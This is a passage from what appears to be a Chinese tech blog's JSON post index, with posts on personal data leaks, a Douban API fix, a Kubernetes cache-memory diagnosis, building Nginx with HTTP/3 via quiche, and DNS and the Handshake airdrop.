2018年8月28日，网上突然出现了华住旗下多个连锁酒店入住信息数据售卖的行为，数据涉及5亿条的用户个人信息及入住记录，而这些泄密的数据中，包含的不少私密信息，比如身份证号、家庭住址、银行卡号等等。 2018年8月底又是在暗网上，一个ID为“bijiaodiao1688”的用户在公然售卖顺丰快递数据，其中牵扯到了3亿用户数据信息，售价是2个比特币，而这些信息中包含了寄件人、收件人的姓名、地址、电话等，为了证明数据的准确性，购买者可以选择先“验货”，验货数据量10万条，验货费用0.01个比特币。 这些层出不穷的数据泄露事件使得人们一直在担心个人隐私是否会随着互联网的发展而逐渐消失以至不存在？我想告诉大家的是一个非常沮丧的答案，大多数互联网用户只要你通过网络进行活动就没有任何隐私可言。正所谓涉密不上网，上网不涉密。对于个体用户来说，个人数据信息的产生、存储、转移和使用是不受用户个人意志的控制的，每天所使用的聊天工具、购物网站、打车软件、求职软件、地图工具、外卖软件等等都有可能收集着你的隐私，一旦平台方不小心遭遇黑客入侵或是平台或平台内有权查看数据的员工非法将这些数据贩卖从中牟利对于个体而言是毫无感知。这些数据一旦被泄露，很快就会在整个网络中传播。与此同时一些平台也在利用大数据分析个人隐私从而推出各种服务，也就是所谓的精准推送服务，更有甚者一些平台还通过大数据来“杀熟”，网络是一把双刃剑，它既能够给人们带来便捷而同时如果利用不但也能够毁了一个人。 近日央视连续报道公安系统打击“套路贷”的成果，多家头部大数据风控公司均被不同程度点名，自今年6月以来，公安部门锁定“套路贷”、“714高炮”依赖导流获客和暴力催收这两大帮凶，利用爬虫等工具，为这些“套路贷”平台爬取通讯录等个人敏感信息，并引发命案。这些非法个人信息的主要提供者，不少来自大数据风控公司。其中有一家公司杭州同盾科技有限公司利用爬虫、大数据等技术非法采集、加工个人隐私数据后，非法获利9亿多。据同盾科技2019年中E轮引资的PPT披露，2012年10月成立的同盾科技，2017年净亏损2500万元；2018年实现现金收入5.1亿元，去掉管理成本、人工成本等，利润为正；预计2019年收入为9.8亿元。 据央视新闻报道，（某公司）数据导致疑似催收死亡50人，现已证实19人；（某公司）数据导致疑似催收死亡40人，现已证实18人（见下图） 2018 年某著名搜索引擎公董事长说：“中国人更加开放，对隐私问题没那么敏感，他们愿用隐私来换便捷性跟效率，很多情况下他们是愿意这么做的，但也会遵守相应法规规则”。而事实国内对于隐私保护虽然有相应的法律法规，例如《网络安全法》。但是在实际操作中我们会发现各大厂家收集的数据范围只会越来越广，这种卑劣的行为逐渐的成为各大企业的默契，使得我们每一个人逐渐变成了透明人。大型互联网公司可以比我们自己更了解我们自己，这并不是危言耸听，比如通过你的消费记录可以判断你个人的喜好；通过你的位置信息和wifi接入点可以清晰的判断出你的位置；输入法企业通过分析输入关键词的平时和种类就会知道你的个人性格；我外卖和团购网站可以很清晰的得出你的饮食喜好；通过人脸识别解锁密码和视频聊天完全可以让你的面部信息变成了他们自己的数据，通过智能跑鞋和运动软件可以分析出你的体重步态、步频…… 除了企业自身非法收集个人隐私之外，黑客入侵等导致的隐私泄露也层出不穷，而事实上仅有极少数大平台有人力和精力去完善和保护个人隐私，正如我们上面看到的各种数据泄露案例几乎都是大平台，很显然，哪怕是大平台也无法完全做到不泄露任何数据。更不要提那些小平台小公司所提供的网络服务了。归根结底还是因为各大网络服务方的背后的一个个企业实际都是由资本推动的，而资本对于隐私保护或数据安全这种非核心业务很显然并不会投入太多人力物力财力去做，同时也是出于方面监管等原因，我们就会看到各种企业数据泄露事件中会出现连密码都是明文传输的。 那么对于个人而言如何才能保证自己的隐私不会被恶意收集和爬取呢？这里我分享几点建议： 首先，遵循“最小权限”原则，当使用某一个服务时尽量只授予其最小权限，比如一个音乐软件，那就只允许其读取和写入文件，其他的录音、通话、通讯录等非必要权限一概不给，当然我们会发现很多软件如果你不给他权限就不给用户使用，对于这种行为，我强烈建议去投诉并拒绝使用他。 第二，除非确有必要，否则不必提供实名信息，在上传真实信息前，可以通过将敏感数据，例如身份证等数据进行打码，注明“仅允许办理 XXX业务使用，他用无效”等字样，防止信息泄露后被多次非法使用。 第三，在使用一些平台提供的服务时，对上传的数据进行二次加工，去除一些敏感信息，包括地理位置、家庭地址等等，对于一些敏感进行进行”打码”防止被泄露。 第四，保持“怀疑”，不要轻信任何具有诱惑力的链接，例如中奖了或者领红包之类的，防止被欺骗导致财产和隐私遭受损失。正所谓，害人之心不可有，防人之心不可无。在网络世界里，多留个心眼，从意识上保持对一切的“怀疑”，并且从心态认清“天下没有免费的午餐”。 第五，不要在多个平台使用相同用户名和密码，慎用弱密码，防止被撞库或被暴力破解，近日，网络安全公司NordPass公布2019年度最差密码列表，其中“12345”被破解280万次位居第一。NordPass 的研究表明，“最流行的密码包含显然易见且容易猜到的数字组合，比如 12345、111111、123321，还有键盘上简易组合，像 asdfghjkl、qazwsx 和1qaz2wsx 等。让人大跌眼镜的是，最明显的’password’仍然非常受欢迎，有 830846 人使用“。所谓“撞库”，即黑灰产设法攻破某一网站后，会用获取的账号密码去测试其他平台，那些多个平台用一套账号密码的用户就会中招。为确保安全，重要平台的账号密码不要与其他平台一样。如果可以，开通双因素认证。此外，长远来看，相比于简单的数字密码，指纹识别、人脸识别等生物识别是更安全的身份核验方式。生物识别从根本上解决了“撞库”风险。而如果必须要使用密码，也可以采用一些较为安全的密码管理软件，例如 1password、 lastpass等。 个人在使用互联网产品的时候要防止个人信息被悄无声息地掠夺，同时也要自身做好安全防范工作，在个人信息受到侵害的时候要果断拿起法律武器保护自己，积极为个人信息保护贡献力量。","categories":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"解决pure 主题豆瓣图书列表不显示的问题","slug":"解决pure-主题豆瓣图书列表不显示的问题","date":"2020-03-20T12:17:26.000Z","updated":"2021-02-26T06:05:29.356Z","comments":true,"path":"posts/6009a574.html","link":"","permalink":"https://awen.me/posts/6009a574.html","excerpt":"","text":"问题我这个博客的主题使用的是cofess 的 pure 主题，然后我发现他的这个图书调用的豆瓣的 API 出现了 403 我们发现这个主题的博主博客豆瓣的请求的地址是 1https:&#x2F;&#x2F;api.douban.com&#x2F;v2&#x2F;book&#x2F;user&#x2F;cofess&#x2F;collections?callback&#x3D;jQuery11240493909278846661_1584706729547&amp;start&#x3D;0&amp;count&#x3D;100&amp;_&#x3D;1584706729548 Google 一番，发现豆瓣停止了免费 api 的使用，但是如果以前申请过 api 的可以使用，于是我找了个配上发现可以正常调用了 解决只需要在这个请求地址加上个apikey这个参数即可，如下所示 1https:&#x2F;&#x2F;api.douban.com&#x2F;v2&#x2F;book&#x2F;user&#x2F;173665529&#x2F;collections?apikey&#x3D;0df993c66c0c636e29ecbb5344252a4a&amp;callback&#x3D;jQuery112407121583411878931_1584706858420&amp;start&#x3D;0&amp;count&#x3D;100&amp;_&#x3D;1584706858421 那怎么加呢，找到 pure-&gt;_script-&gt;douban.ejs ，找到如下这段，将 var url = 这里的 API 地址修改下加上 apikey即可 代码如下: // Ajax 获取豆瓣书单数据，数据格式json function loadDoubanCollections() { var _this = this; // https://api.douban.com/v2/book/user/:name/collections?start=0&amp;count=100 var url = &quot;https://api.douban.com/v2/book/user/&lt;%= theme.douban.user %&gt;/collections?apikey=0df993c66c0c636e29ecbb5344252a4a&quot; $.ajax({ url: url, type: &apos;GET&apos;, data: { start:&lt;%= theme.douban.start %&gt;, // 从哪一条记录开始 count:&lt;%= theme.douban.count %&gt; // 获取豆瓣书单数据条数 }, dataType: &apos;JSONP&apos;, //here success: function(data) { // console.log(data); onLoadDouban(data); } }); }","categories":[{"name":"hexo","slug":"hexo","permalink":"https://awen.me/categories/hexo/"}],"tags":[{"name":"hexo","slug":"hexo","permalink":"https://awen.me/tags/hexo/"}]},{"title":"一个线上 kubernetes 的内存增长问题","slug":"一个线上-kubernetes-的内存增长问题","date":"2020-03-20T06:10:10.000Z","updated":"2021-02-26T06:05:29.295Z","comments":true,"path":"posts/b49c4422.html","link":"","permalink":"https://awen.me/posts/b49c4422.html","excerpt":"","text":"从生产环境遇到的一个内存暴涨问题说起某用户生产环境的 kubernetes 节点遇到的一个问题，大概问题是这样的，用户反馈他的业务所在 pod 一在吃内存，内存占用高达 17 G 并且还是持续在增长。接到用户反馈后，我秒登 VPN ，进到用户的环境开始排查问题。 当时想的思路是这样的，既然是内存问题，那先看看这个业务所在 pod 里面到底是哪个进程在吃内存吧。 1kubectl exec -it pod -n xxx &#x2F;bin&#x2F;bash 执行 top 命令查看下当前 pod 正在运行的进程，发现在容器里面有一个 7 号进程 VSZ 占用 6522m，这里先简单说明下 top 看到的一些和内存指标相关的参数含义： RSS是Resident Set Size（常驻内存大小）的缩写，用于表示进程使用了多少内存（RAM中的物理内存），RSS不包含已经被换出的内存。RSS包含了它所链接的动态库并且被加载到物理内存中的内存。RSS还包含栈内存和堆内存。 VSZ是Virtual Memory Size（虚拟内存大小）的缩写。它包含了进程所能访问的所有内存，包含了被换出的内存，被分配但是还没有被使用的内存，以及动态库中的内存。 但是用户反馈的是占用 17 G之多，那很显然，并不是这个进程在捣鬼，可是整个容器里面确实就只有这个进程在运行着，并且该 Java 进程还设置了分配内存的限制，最大不会超过 4g，可是内存还是一直在涨。 而且不知道大家有没有发现，容器里面执行 top 看到的信息很少，我们对比下实际操作系统的 top 命令执行结果多了很多列，例如RES、 %MEM 等等。 所以只从 top 看是不准确的，于是我们直接去查这个进程的内存占用，执行 1cat &#x2F;proc&#x2F;7&#x2F;status 查看当前 pid 的状态，其中有一个字段VmRSS 表示当前进程所使用的内存，然而我们发现用户当前进程所占用的内存才2.3G 左右。 而通过kubectl top pod 查看 pod 的内存占用 确实发现该 pod 占用 17 G ，说明并不是容器内进程内存泄露导致的问题，那这就奇怪了，是什么原因导致占用这么多内存呢？ 要继续排查这个问题，我们就需要先看看容器的内存统计是如何计算的了。 众所周知，操作系统系统的内存会有一部分被buffer、cache之类占用，在 Linux 操作系统中会把这部分内存算到已使用，那么对于容器来讲，也会把某容器引发的cache占用算到容器占用的内存上，要验证这个问题，你可以启动一个容器，然后直接使用 dd 去创建一个大文件观察下内存变化。 1234[root@8e3715641c31 &#x2F;]# dd if&#x3D;&#x2F;dev&#x2F;zero of&#x3D;my_new_file count&#x3D;1024000 bs&#x3D;30241024000+0 records in1024000+0 records out3096576000 bytes (3.1 GB, 2.9 GiB) copied, 28.7933 s, 108 MB&#x2F;s 你会发现，系统的 buff/cache 这一列会不断的增大。 1234[root@8e3715641c31 &#x2F;]# free -h total used free shared buff&#x2F;cache availableMem: 3.7Gi 281Mi 347Mi 193Mi 3.1Gi 3.0GiSwap: 0B 0B 0B 继续回到我们上面的这个生产环境问题，会不会是 Java 程序在不停的往磁盘写文件，导致 cache 不断的增大呢？ 我们执行 1kubectl logs -f pod-name -n namespace-name 查看，发现整屏幕不断的输出 debug 日志。然后回到开头的图，我们会发现cache 占用了 20g 左右。 我们尝试把 cache 清掉下看看内存是否会下降，执行 1echo 3 &gt; &#x2F;proc&#x2F;sys&#x2F;vm&#x2F;drop_caches &#x2F;&#x2F;表示清空所有缓存（pagecache、dentries 和 inodes） proc/sys是一个虚拟文件系统，可以通过对它的读写操作做为与kernel实体间进行通信的一种手段。我们可以通过修改/proc中的文件，来对当前kernel的行为做出调整。通过调整/proc/sys/vm/drop_caches来释放内存。其默认数值为0 当执行完这条命令后，该 pod 的内存瞬间变小，同时磁盘 I/O 持续飙升，说明正是 cache 问题导致的，于是告诉用户调整日志的级别，把 debug 改成 info，发现内存问题得到解决。 如何解决生产环境内存飙升的问题首先，合理的规划资源，对每个 Pod 限制其资源使用，kubernetes 提供了针对 pod 级别的资源限制功能，我们可以非常容易的通过 limits 来限制 Pod 的内存和 CPU ，这样一来一旦内存达到使用限制，pod 会自动重启，而不会影响到其他 pod。 1234567resources: requests: cpu: &quot;200m&quot; memory: &quot;128Mi&quot; limits: cpu: &quot;500m&quot; memory: &quot;512Mi&quot; 再次，针对应用本身也需要加上资源使用限制，例如 Java 程序可以限制堆内存和非堆内存的使用： 堆内存分配： JVM 初始分配的内存由-Xms 指定，默认是物理内存的 1/64； JVM 最大分配的内存由-Xmx 指定，默认是物理内存的 1/4； 默认空余堆内存小于 40% 时，JVM 就会增大堆直到-Xmx 的最大限制；空余堆内存大于 70% 时，JVM 会减少堆直到 -Xms 的最小限制； 因此服务器一般设置-Xms、-Xmx 相等以避免在每次 GC 后调整堆的大小。对象的堆内存由称为垃圾回收器的自动内存管理系统回收。 非堆内存分配： JVM 使用-XX:PermSize 设置非堆内存初始值，默认是物理内存的 1/64； 由 XX:MaxPermSize 设置最大非堆内存的大小，默认是物理内存的 1/4； -Xmn2G：设置年轻代大小为 2G； -XX:SurvivorRatio，设置年轻代中 Eden 区与 Survivor 区的比值。 再次，应用本身要做好优化，例如本案例中所类似的问题要尽量在生产环境发生，即在生产环境开 debug 模式。因为频繁的写日志会把 cache 打的非常高。 最后，加强监控，针对应用本身的资源使用情况和系统的各项监控指标要完善，便于及时发现问题。","categories":[{"name":"kubernetes","slug":"kubernetes","permalink":"https://awen.me/categories/kubernetes/"}],"tags":[{"name":"kubernetes","slug":"kubernetes","permalink":"https://awen.me/tags/kubernetes/"}]},{"title":"玩转 HTTP3","slug":"玩转-HTTP3","date":"2020-03-20T06:03:51.000Z","updated":"2021-02-26T06:05:29.347Z","comments":true,"path":"posts/3e8a7e70.html","link":"","permalink":"https://awen.me/posts/3e8a7e70.html","excerpt":"","text":"超文本传输协议（英语：HyperText Transfer Protocol，缩写：HTTP）是一种用于分布式、协作式和超媒体信息系统的应用层协议。自1990年代初以来，HTTP 协议是整个Internet进行数据通信的基础。 在 HTTP/1.0 中，每一个TCP请求或响应都会被分配一个新的连接，这就导致了连接启动缓慢，在此之后，如何规避 TCP 启动慢就一直是 HTTP协议改善的核心。 此后，在HTTP/1.1中引入了keep-alive 的概念，其允许在同一个 TCP 连接中对多个请求或响应进行序列号，从而使得不需要为每个请求都设置新的连接，避免建立新连接带来的网络开销。但是这个版本的keep-alive 连接不支持同时发送多个请求，随着互联网的迅猛发展，又带来了新的问题，如何让数据发送效率提高。 在2015年，它HTTP发布了第二个版本，即HTTP/2，该进行了重大更新。例如： 在建立连接后，可以多路复用 在建立连接后，一次的请求与被响应，视为流 数据传输分为二进制帧片段 而 HTTP/3是HTTP协议的第三个主要版本。在HTTP/3中，将弃用TCP协议，改为使用基于UDP协议的QUIC协议实现。实际上 HTTP/3 的前身是HTTP over QUIC，QUIC 是快速UDP网络连接的简称，由Google公司研发，该协议旨在取代TCP协议，使网页传输更快、更稳定、更安全。 2018年10月，互联网工程任务组（IETF） HTTP和QUIC工作组主席Mark Nottingham提出了将HTTP-over-QUIC更名为HTTP/3，以区分其特点以及与Google 公司的QUIC的独立性。 为什么使用UDP+QUIC实际上，在此前的HTTP 协议中，一直是使用TCP作为传输协议。为什么在HTTP/3中要换成UDP呢？众所周知，TCP 是一种面向连接的、可靠的、基于字节流的传输层通信协议，在数据传输过程中其加入了序列号、对收到的保温进行排序以检测重复数据，数据重传、拥塞控制、使用校验和确保无错传输、流控制等。使用TCP 协议进行数据传输会经过三次握手，当使用TCP创建一个连接。在连接创建过程中，很多参数要被初始化，例如序号被初始化以保证按序传输和连接的强壮性，其目的是保证数传输和断开的可靠，确保所有数据都被完全传输。因此很多对业务稳定性非常高的协议都一直采用TCP协议作为数据传输协议。 TCP 报头 事实上，在HTTP/2 之前的版本中，都是采用TCP 进行数据传输的。而 HTTP/2 引入的多路复用技术改善了HTTP/1.1的keep-alive 带来的缺陷，但是当数据包丢失增加，HTTP/2的性能会由于TCP处理包重传的方式(HOL阻塞)而下降，从而非常影效率。因为所有的流都是共享同一个连接，当数据包丢失超出阈值，HTTP/2的运行效率可能还不如HTTP/1的效率高。 而UDP协议则比较简单，其特点如下： 无需建立连接，因此UDP不会引入建立连接的时延。 没有TCP 那么复杂的报头，例如重传、序列号等等 速度快，但是不保证数据的完整性 其报头如下 那么既然使用UDP进行数据传输如此不可靠，为什么 HTTP/3 会使用UDP，事实上，这与整个互联网快速发展的大背景有关系，随着移动互联网快速发展以及物联网以及5G技术的逐步兴起，网络交互的场景越来越丰富，大量的音频、视频、直播等数据在网络传上输，用户对网络传输效率和 WEB 响应速度的要求也越来越高。HTTP/3 协议当然不能单独使用UDP协议，它必须在QUIC的配合下才可以使用UDP，其把数据的完整性校验这一环节放在了UDP协议之上，QUIC的特点： 减少了 TCP 三次握手及 TLS 握手时间，使用TCP协议配合HTTPS，TLS 完全握手需要至少 2 个 RTT 才能建立，简化握手需要 1 个 RTT 的握手延迟，而QUIC在TLS握手时间上，由于建立在 UDP 的基础上，同时又实现了 0RTT 的安全握手，所以在大部分情况下，只需要 0 个 RTT 就能实现数据发送。 改进的拥塞控制，QUIC 协议当前默认使用了 TCP 协议的 Cubic 拥塞控制算法，同时也支持 CubicBytes, Reno, RenoBytes, BBR, PCC 等拥塞控制算法。 避免队头阻塞的多路复用，队头阻塞主要是 TCP 协议的可靠性机制引入的。上面说了TCP 为了实现可靠性，使用了很多机制来保障数据的传输，例如使用序列号来标识数据的顺序，数据必须按照顺序处理，如果前面的数据丢失，后面的数据就算到达了也不会通知应用层来处理 ，而QUIC使用UDP，没有三次握手和连接，只需要用户端和服务端的应用程序支持 QUIC 协议，完全避开了操作系统和中间设备的限制，同时相比此前的HTTP/2的多路复用，QUIC 一个连接上的多个流之间没有依赖。这样可以更快的并行处理任务。 比TCP协议更安全，TCP 协议的头部没有加密和认证，在传输过程中很容易被篡改，注入和窃听。而 QUIC 除了个别报文比如 PUBLIC_RESET 和 CHLO，所有报文头部都是经过认证的，报文 Body 都是经过加密的。 能够连接迁移，什么是连接迁移，比如使用手机从无线网切换到移动5G，这时客户端的 IP会改变，需要重新建立和服务端的 TCP 连接。而QUIC实现了任何一条 QUIC 连接不再以 IP 及端口进行标识，而是以一个 64 位的随机数作为 ID 来标识，这样当网络变化，IP和端口改变，只要 ID 不变，这条连接依然维持着，上层业务逻辑感知不到变化，不会中断，也就不需要重连。且由于这个ID 是随机的，产生冲突的概率非常小。 更科学的流量控制器，TCP 为了保证可靠性，窗口左边沿向右滑动时的长度取决于已经确认的字节数。如果中间出现丢包，就算接收到了更大序号的 Segment，窗口也无法超过这个序列号。而QUIC 基于流和连接级别的流量控制，类似HTTP/2，通过window_update帧告诉对端自己可以接收的字节数，这样发送方就不会发送超过这个数量的数据。通过BlockFrame告诉对端由于流量控制被阻塞了，无法发送数据。就算此前有些数据包没有接收到，它的滑动只取决于接收到的最大偏移字节数。 如何使用 HTTP/3好了，介绍了HTTP/3，那么我们怎么才能够使用HTTP/3呢？事实上，现在很多云厂商都实现了 HTTP/3，比如腾讯云的负载均衡器，阿里云的CDN服务、CloudFlare等等。那么如果你是使用类似Nginx 这样的web服务器如何使用HTTP/3呢？ 以Nginx 为例，实际上，Nginx 在 2019 年 3 月 21 日公布了 1.17.x 版本的路线图，其中谈到了支持 QUIC 和 HTTP/3 的计划。但是至今，Nginx 已经发布了 1.17.8 的版本，在最新的1.17.8的 CHANGES 中也没有发现HTTP/3的身影。估计如果希望原生的 Nginx 支持 HTTP/3 还需要继续等待。 可喜的是边缘计算厂商 CloudFlare 开源了 QUIC 的实现 quiche，使得 Nginx 提前支持 HTTP/3 ，quiche 项目地址: https://github.com/cloudflare/quiche/tree/master/extras/nginx 。 CloudFlare 已经成功在其CDN业务中实现了QUIC的部署，基于HTTP3 Quic的实现靠的就是他们开发的Quiche实现。 根据 quiche 的文档，需要下载源码和 Nginx 一同编译，而因为需要 BoringSSL 以及 quiche 开发语言的不同，在编译 Nginx 所需要的环境基础上，还需要 cmake、rust、cargo、golang 等一系列工具的支持。 安装步骤1.下载的nginx，并解压，注意，这个补丁只支持1.16.x 12curl -O https:&#x2F;&#x2F;nginx.org&#x2F;download&#x2F;nginx-1.16.1.tar.gztar xzvf nginx-1.16.1.tar.gz 2.克隆quiche 1git clone --recursive https:&#x2F;&#x2F;github.com&#x2F;cloudflare&#x2F;quiche 使用patch将补丁引入 12cd nginx-1.16.1patch -p01 &lt; ..&#x2F;quiche&#x2F;extras&#x2F;nginx&#x2F;nginx-1.16.patch 4.构建nginx， 使其支持 HTTP/3 12345678.&#x2F;configure \\ --prefix&#x3D;$PWD \\ --build&#x3D;&quot;quiche-$(git --git-dir&#x3D;..&#x2F;quiche&#x2F;.git rev-parse --short HEAD)&quot; \\ --with-http_ssl_module \\ --with-http_v2_module \\ --with-http_v3_module \\ --with-openssl&#x3D;..&#x2F;quiche&#x2F;deps&#x2F;boringssl \\ --with-quiche&#x3D;..&#x2F;quiche 5.执行make 1make 6.然后配置nginx的vhost，一个HTTP/3的配置如下 12345678910111213141516171819202122server &#123; listen 80; # Enable HTTP&#x2F;2 (optional). listen 443 ssl http2; # Enable QUIC and HTTP&#x2F;3. listen 443 quic reuseport; server_name www.awen.me; root &#x2F;vdata&#x2F;www&#x2F;default; index index.html; ssl_certificate &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;ssl&#x2F;awen.me.crt; ssl_certificate_key &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;ssl&#x2F;awen.me.key; ssl_protocols TLSv1.2 TLSv1.3; ssl_ciphers …… # Add Alt-Svc header to negotiate HTTP&#x2F;3. add_header alt-svc &#39;h3-23&#x3D;&quot;:443&quot;; ma&#x3D;86400&#39;; ……&#125; 更具体的配置和说明，可以参考官方文档https://github.com/cloudflare/quiche/tree/master/extras/nginx QUIC 的实现原理是首先客户端发起 tcp 连接判断服务端响应头是否有 alt-svc 头，如有则尝试使用 udp 443 去进行连接。因此，我们看到上面的配置中 add_header alt-svc &#39;h3-23=&quot;:443&quot;; ma=86400&#39;;，客户端请求类似如下: Alt-Svc 全称为“Alternative-Service”，直译为“备选服务”。该头部列举了当前站点备选的访问方式列表。一般用于在提供 “QUIC” 等新兴协议支持的同时，实现向下兼容。 h3-23=”:443” 这部分内容定义了替代服务使用的协议、主机名和端口，其中主机名和端口可选。多个替代服务之间用英文逗号分隔。 ma 是 max-age 的缩写，单位为秒。显然，它表示浏览器在指定时间内，可以直接使用替代服务地址。 客户端访问1.浏览器配置 1.以chrome 为例进行配置，开启 quic 的支持，chrome://flags 安装如图所示 Experimental QUIC protocol 设置为 enable 重启浏览器 2.如何判断QUIC是否已经生效。 第一种方法是安装插件，在Chrome 商店安装 HTTP/2 and SPDY indicator，右上角有个闪电图标会显示 google 已经开启 quic/43版本的支持。如图所示: 打开 chrome://net-internals/#quic 也可以看到当前使用 quic 协议的站点连接情况。 第二种方式是通过wireshark抓包也可以看到QUIC的数据包，如图所示:","categories":[{"name":"HTTP","slug":"HTTP","permalink":"https://awen.me/categories/HTTP/"}],"tags":[{"name":"HTTP","slug":"HTTP","permalink":"https://awen.me/tags/HTTP/"},{"name":"HTTP3","slug":"HTTP3","permalink":"https://awen.me/tags/HTTP3/"},{"name":"QUIC","slug":"QUIC","permalink":"https://awen.me/tags/QUIC/"}]},{"title":"给开发者送福利，免费送将近 10000 人民币","slug":"给开发者送福利，免费送将近-10000-人民币","date":"2020-03-20T04:29:19.000Z","updated":"2021-02-26T06:05:29.351Z","comments":true,"path":"posts/b306e865.html","link":"","permalink":"https://awen.me/posts/b306e865.html","excerpt":"","text":"GitHub 有一个区块链项目 Handshake 正在面向GitHub 上前 25万名开发者派送 4,246.99 HNS币。大约价值 1358.56美元，换算成人民币则是差不多近1万元人民币。 那么，怎么才能薅到这么让人惊喜的羊毛呢？ 了解该项目在准备薅这个羊毛之前，我们首先了解下什么是 handshake，handshake 是一个开源的项目，其目前是一个实验性的对等根命名系统。这是官网的介绍，其官网https://handshake.org/ 如果你了解 DNS，你一定知道，我们现在所使用的 DNS 系统，是一个树状的结构，DNS 服务器根据域名的层级，进行分级查询。每一级域名都有自己的NS几率，NS记录指向该向该级域名的域名服务器。这些服务器知道下一级域名的各种记录。 所谓分级查询，就是从根域名开始，依次查询每一级域名的NS记录，直到查到最终的IP地址，过程大致如下： 从根域名服务器查到顶级域名服务器的NS记录和A记录（IP地址） 从顶级域名服务器查到次级域名服务器的NS记录和A记录（IP地址） 从次级域名服务器查出主机名的IP地址 当我们访问一个域名时，比如 www.baidu.com，DNS服务器会把域名解析到一个IP地址，然后在此IP地址的主机上将一个子目录与域名绑定。域名解析时会添加解析记录，这些记录有：A记录、AAAA记录、CNAME记录、MX记录、NS记录、TXT记录等等。 A记录： 将域名指向一个IPv4地址（例如：94.1.122.10），需要增加A记录 CNAME记录： 如果将域名指向一个域名，实现与被指向域名相同的访问效果，需要增加CNAME记录。这个域名一般是主机服务商提供的一个域名 MX记录： 建立电子邮箱服务，将指向邮件服务器地址，需要设置MX记录。建立邮箱时，一般会根据邮箱服务商提供的MX记录填写此记录 NS记录： 域名解析服务器记录，如果要将子域名指定某个域名服务器来解析，需要设置NS记录 TXT记录： 可任意填写，可为空。一般做一些验证记录时会使用此项，如：做SPF（反垃圾邮件）记录 AAAA记录： 将主机名（或域名）指向一个IPv6地址，需要添加AAAA记录 SRV记录： 添加服务记录服务器服务记录时会添加此项，SRV记录了哪台计算机提供了哪个服务。格式为：服务的名字.协议的类型。 SOA记录： SOA叫做起始授权机构记录，NS用于标识多台域名解析服务器，SOA记录用于在众多NS记录中那一台是主服务器。 PTR记录： PTR记录是A记录的逆向记录，又称做IP反查记录或指针记录，负责将IP反向解析为域名。 12345678910111213141516171819202122~$ dig www.baidu.com; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.10-Ubuntu &lt;&lt;&gt;&gt; www.baidu.com;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 6701;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 65494;; QUESTION SECTION:;www.baidu.com. IN A;; ANSWER SECTION:www.baidu.com. 14 IN CNAME www.a.shifen.com.www.a.shifen.com. 157 IN A 180.101.49.12www.a.shifen.com. 157 IN A 180.101.49.11;; Query time: 0 msec;; SERVER: 127.0.0.53#53(127.0.0.53);; WHEN: Tue Feb 18 11:11:18 CST 2020;; MSG SIZE rcvd: 101 目前世界上共有13台根域名服务器，我们使用dig 命令可以查看，这些服务器分布在全球，1个为主根服务器，放置在美国。其余12个均为辅根服务器，其中9个放置在美国，欧洲2个，位于英国和瑞典，亚洲1个，位于日本。 1234567891011121314151617181920212223242526272829303132dig; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.10-Ubuntu &lt;&lt;&gt;&gt;;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 21161;; flags: qr rd ra; QUERY: 1, ANSWER: 13, AUTHORITY: 0, ADDITIONAL: 1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 65494;; QUESTION SECTION:;. IN NS;; ANSWER SECTION:. 515317 IN NS m.root-servers.net.. 515317 IN NS i.root-servers.net.. 515317 IN NS j.root-servers.net.. 515317 IN NS k.root-servers.net.. 515317 IN NS l.root-servers.net.. 515317 IN NS d.root-servers.net.. 515317 IN NS e.root-servers.net.. 515317 IN NS h.root-servers.net.. 515317 IN NS g.root-servers.net.. 515317 IN NS b.root-servers.net.. 515317 IN NS a.root-servers.net.. 515317 IN NS f.root-servers.net.. 515317 IN NS c.root-servers.net.;; Query time: 0 msec;; SERVER: 127.0.0.53#53(127.0.0.53);; WHEN: Mon Feb 17 19:40:22 CST 2020;; MSG SIZE rcvd: 239 那么问题来了，如果哪一天根服务器挂了，怎么办？事实上根服务器在历史上确实遭遇过攻击，在2002年的10月21日美国东部时间下午4:45开始，这13台服务器又遭受到了有史以来最为严重的也是规模最为庞大的一次网络袭击。 此次受到的攻击是DDoS攻击，超过常规数量30至40倍的数据猛烈地向这些服务器袭来并导致其中的9台不能正常运行。7台丧失了对网络通信的处理能力，另外两台也紧随其后陷于瘫痪。 第二，就算没有遭受攻击，由于根服务器在美国，各个国家也是受制于人，因此各个国家都将根服务器进行镜像，以防止根服务器故障导致网络瘫痪，2019年6月24日，工信部同意中国互联网络信息中心设立域名根服务器及运行机构。工业和信息化部发布关于同意中国互联网络信息中心设立域名根服务器（F、I、K、L根镜像服务器）及域名根服务器运行机构的批复。 根据工信部的公告，工信部同意中国互联网络信息中心设立域名根服务器（F、I、K、L根镜像服务器）及域名根服务器运行机构，负责运行、维护和管理编号分别为JX0001F、JX0002F、JX0003I、JX0004K、JX0005L、JX0006L的域名根服务器。 此外，当前的DNS 服务还存在一些弊端，例如DNS污染等问题。其顶级域最终依赖于中央角色，他们对系统的完全控制权是诚实的，因此他们很容易受到黑客攻击，审查制度和腐败行为的侵害。 而这个项目就是解决传统 DNS 所存在的问题，通过区块链技术来实现将根服务器的角色分散开来。该项目旨在探索一些新技术和新手段，以这些必要手段来构建更加分散的互联网。从1990年代开始，互联网上的服务已经变得更加集中，但是并不能实现互联网最初的分散化愿景。 如何薅羊毛好了，项目介绍完了，事实上该项目从包括A16Z和红杉资本在内的硅谷顶级投资者筹集了资金，为了吸引一些开发者加入，于是利用GitHub 天然的优势给GitHub 前25万名开发者发放福利。 项目称 github上的前25万名用户的SSH密钥和PGP已添加到 merkle树中。在大约250,000个用户中，有大约175,000个用户在创建树时具有有效的SSH和PGP密钥。 以下是该项目的运行说明 1234567891011The top ~250,000 users on github have had their SSH keys and PGP added to a merkle tree. Out of those ~250,000 users, ~175,000 of them had valid SSH and PGP keys at the time of tree creation.If you had 15 or more followers on github during the week of 2019-02-04, your github SSH &amp; PGP keys are included in the merkle tree.Likewise, roughly 